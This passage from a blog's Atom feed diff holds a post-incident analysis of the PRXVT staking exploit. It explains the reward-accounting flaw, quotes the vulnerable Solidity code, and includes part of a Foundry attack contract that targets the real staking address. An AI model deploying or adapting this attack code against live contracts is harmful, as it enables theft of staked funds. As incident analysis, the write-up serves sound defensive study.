+&lt;ul&gt;
+&lt;li&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;core&#x2F;blob&#x2F;b8d07a5a7731c565ad6c49b555b21b7cceedce61&#x2F;packages&#x2F;sentinel-api-service&#x2F;src&#x2F;constants.ts#L10-L89&quot;&gt;네트워크별 Sentinel API 주소&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;metamask-extension&#x2F;blob&#x2F;0997172ccbed2dfd31c56cf070b244d44cfb42ed&#x2F;app&#x2F;scripts&#x2F;lib&#x2F;transaction&#x2F;hooks&#x2F;index.ts#L133-L215&quot;&gt;거래 제출 경로 선택&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;metamask-extension&#x2F;blob&#x2F;0997172ccbed2dfd31c56cf070b244d44cfb42ed&#x2F;app&#x2F;scripts&#x2F;lib&#x2F;transaction&#x2F;delegation.ts#L192-L206&quot;&gt;위임 서명과 실행 데이터 인코딩&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;승인 전 가스비 견적: &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;core&#x2F;blob&#x2F;0bd8c26105066911fb73465c95c39ceea1206ee4&#x2F;packages&#x2F;transaction-controller&#x2F;src&#x2F;TransactionController.ts#L1301-L1338&quot;&gt;요청 시점&lt;&#x2F;a&gt;과 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;core&#x2F;blob&#x2F;0bd8c26105066911fb73465c95c39ceea1206ee4&#x2F;packages&#x2F;transaction-controller&#x2F;src&#x2F;utils&#x2F;gas-fee-tokens.ts#L70-L123&quot;&gt;요청 데이터&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;ethereum.org&#x2F;developers&#x2F;docs&#x2F;transactions&#x2F;#transaction-lifecycle&quot;&gt;Ethereum 거래 생명주기&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MetaMask&#x2F;metamask-extension&#x2F;tree&#x2F;0997172ccbed2dfd31c56cf070b244d44cfb42ed&quot;&gt;분석 기준 소스&lt;&#x2F;a&gt; — MetaMask Extension 13.56.0&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="ko">
+        <title>PRXVT staking exploit analysis</title>
+        <published>2026-01-02T00:00:00+00:00</published>
+        <updated>2026-01-02T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://nogie-dev.github.io/blog/prxvt-staking-exploit-analysis/"/>
+        <id>https://nogie-dev.github.io/blog/prxvt-staking-exploit-analysis/</id>
+        
+        <content type="html" xml:base="https://nogie-dev.github.io/blog/prxvt-staking-exploit-analysis/">&lt;p&gt;This write-up walks through the PRXVT staking exploit in the order it unfolded, then maps each step back to the vulnerable code paths that made it possible.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;actors-and-contracts&quot;&gt;Actors and contracts&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Attacker EOAs: &lt;code&gt;0x7407f9bdc4140d5e284ea7De32A9De6037842f45&lt;&#x2F;code&gt; (controller&#x2F;beneficiary)&lt;&#x2F;li&gt;
+&lt;li&gt;Attack Controller Contract (ACC): &lt;code&gt;0x702980b1Ed754C214B79192a4D7c39106f19BcE9&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Attack1 Contract (AC): &lt;code&gt;0x8fA06125249ceCE812E96389758910e32c9B2F89&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy1.png&quot; alt=&quot;Flow overview&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;timeline-of-the-exploit&quot;&gt;Timeline of the exploit&lt;&#x2F;h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;ACC funds AC with stPRXVT&lt;&#x2F;strong&gt;
+&lt;ul&gt;
+&lt;li&gt;ACC transfers &lt;strong&gt;15,000,000 stPRXVT&lt;&#x2F;strong&gt; to AC. No staking call is made; this is just a raw token transfer.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy2.png&quot; alt=&quot;ACC transfers stPRXVT to AC&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;ol start=&quot;2&quot;&gt;
+&lt;li&gt;&lt;strong&gt;AC calls &lt;code&gt;execute()&lt;&#x2F;code&gt; to claim rewards immediately&lt;&#x2F;strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Inside &lt;code&gt;execute()&lt;&#x2F;code&gt;, AC calls &lt;code&gt;claimReward()&lt;&#x2F;code&gt; on the staking contract. Because of how rewards are computed, the contract treats the freshly transferred stPRXVT balance as if it had accrued rewards over time.&lt;&#x2F;li&gt;
+&lt;li&gt;AC receives PRXVT rewards, then transfers both the claimed PRXVT and the stPRXVT back to the attacker&#x2F;ACC.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy3.png&quot; alt=&quot;AC executes claimReward and drains PRXVT&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;ol start=&quot;3&quot;&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Loop and repeat with fresh contracts&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;The attacker deploys fresh Attack contracts (e.g., via different CREATE2 salts), transfers in stPRXVT, calls &lt;code&gt;claimReward()&lt;&#x2F;code&gt;, and drains rewards again. Each new contract starts with &lt;code&gt;userRewardPerTokenPaid = 0&lt;&#x2F;code&gt;, making the reward calculation reset in the attacker’s favor.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Result&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;The attacker accumulates PRXVT. Liquidity was later pulled, making it harder to cash out, but the estimated loss sits around &lt;strong&gt;$97,852.95&lt;&#x2F;strong&gt; based on on-chain balances at the time.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;h2 id=&quot;vulnerable-staking-code&quot;&gt;Vulnerable staking code&lt;&#x2F;h2&gt;
+&lt;p&gt;Reward claiming:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; claimReward&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt; public&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; nonReentrant whenNotPaused updateReward&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    uint256&lt;&#x2F;span&gt;&lt;span&gt; reward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; rewards[&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    require&lt;&#x2F;span&gt;&lt;span&gt;(reward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color: #2AA198;&quot;&gt; &amp;quot;No rewards to claim&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    rewards[&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    uint256&lt;&#x2F;span&gt;&lt;span&gt; burnAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; (reward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; burnFeePercent)&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 10_000&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    uint256&lt;&#x2F;span&gt;&lt;span&gt; userAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; reward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; burnAmount;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    totalBurned &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;+=&lt;&#x2F;span&gt;&lt;span&gt; burnAmount;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    if&lt;&#x2F;span&gt;&lt;span&gt; (burnAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        prxvtToken.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;safeTransfer&lt;&#x2F;span&gt;&lt;span&gt;(BURN_ADDRESS, burnAmount);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    if&lt;&#x2F;span&gt;&lt;span&gt; (userAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        prxvtToken.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;safeTransfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;, userAmount);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    emit&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; RewardPaid&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;msg.sender&lt;&#x2F;span&gt;&lt;span&gt;, userAmount);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Reward snapshot (modifier) and accrual:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;modifier&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; updateReward&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; account) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    rewardPerTokenStored &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; rewardPerToken&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    lastUpdateTime &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; lastTimeRewardApplicable&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    if&lt;&#x2F;span&gt;&lt;span&gt; (account &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;!= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        rewards[account]&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; earned&lt;&#x2F;span&gt;&lt;span&gt;(account);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        userRewardPerTokenPaid[account]&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; =&lt;&#x2F;span&gt;&lt;span&gt; rewardPerTokenStored;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #CB4B16;&quot;&gt;    _&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Core calculation:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; earned&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; account)&lt;&#x2F;span&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt; public view&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; returns&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    uint256&lt;&#x2F;span&gt;&lt;span&gt; baseReward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;        (&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(account)&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; *&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;rewardPerToken&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; -&lt;&#x2F;span&gt;&lt;span&gt; userRewardPerTokenPaid[account]))&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span&gt; PRECISION&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;        +&lt;&#x2F;span&gt;&lt;span&gt; rewards[account];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    BoostInfo &lt;&#x2F;span&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;storage&lt;&#x2F;span&gt;&lt;span&gt; boost &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _boosts[account];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    if&lt;&#x2F;span&gt;&lt;span&gt; (boost.expiresAt &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; block&lt;&#x2F;span&gt;&lt;span&gt;.timestamp &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; boost.multiplier &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; PRECISION) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;        return&lt;&#x2F;span&gt;&lt;span&gt; (baseReward &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; boost.multiplier)&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span&gt; PRECISION;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    return&lt;&#x2F;span&gt;&lt;span&gt; baseReward;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;why-the-reward-calculation-was-abusable&quot;&gt;Why the reward calculation was abusable&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;On a fresh address&#x2F;contract, &lt;code&gt;userRewardPerTokenPaid[account]&lt;&#x2F;code&gt; is &lt;code&gt;0&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;balanceOf(account)&lt;&#x2F;code&gt; reflects any stPRXVT the account currently holds, even if received via &lt;code&gt;transfer&lt;&#x2F;code&gt; and never staked.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;earned()&lt;&#x2F;code&gt; therefore returns &lt;code&gt;balanceOf(account) * rewardPerToken() &#x2F; 1e18&lt;&#x2F;code&gt; on first call. The staking contract has no knowledge of &lt;em&gt;when&lt;&#x2F;em&gt; or &lt;em&gt;how&lt;&#x2F;em&gt; the stPRXVT arrived.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;claimReward()&lt;&#x2F;code&gt; simply pays out &lt;code&gt;rewards[msg.sender]&lt;&#x2F;code&gt; after &lt;code&gt;updateReward&lt;&#x2F;code&gt; snapshots this calculation.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;The attacker exploited this by transferring in stPRXVT to new contracts that had never participated in staking, immediately invoking &lt;code&gt;claimReward()&lt;&#x2F;code&gt;, and withdrawing the unearned PRXVT rewards.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;attack-contract-mechanics-foundry-test-excerpt&quot;&gt;Attack contract mechanics (foundry test excerpt)&lt;&#x2F;h2&gt;
+&lt;p&gt;The exploit test mirrors on-chain behavior:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color: #CB4B16;&quot;&gt; Attack&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    address&lt;&#x2F;span&gt;&lt;span&gt; prxvtStaking &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    address&lt;&#x2F;span&gt;&lt;span&gt; stPRXVT &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    address&lt;&#x2F;span&gt;&lt;span&gt; PRXVT &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    address&lt;&#x2F;span&gt;&lt;span&gt; attacker &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 0x7407f9bdc4140d5e284ea7De32A9De6037842f45&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt;    function&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; execute&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color: #93A1A1;font-weight: bold;&quot;&gt; external&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;        IExploit&lt;&#x2F;span&gt;&lt;span&gt;(prxvtStaking).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;claimReward&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;        uint256&lt;&#x2F;span&gt;&lt;span&gt; claimed &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; IExploit&lt;&#x2F;span&gt;&lt;span&gt;(PRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;        IExploit&lt;&#x2F;span&gt;&lt;span&gt;(PRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(attacker, claimed);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;        IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(attacker,&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
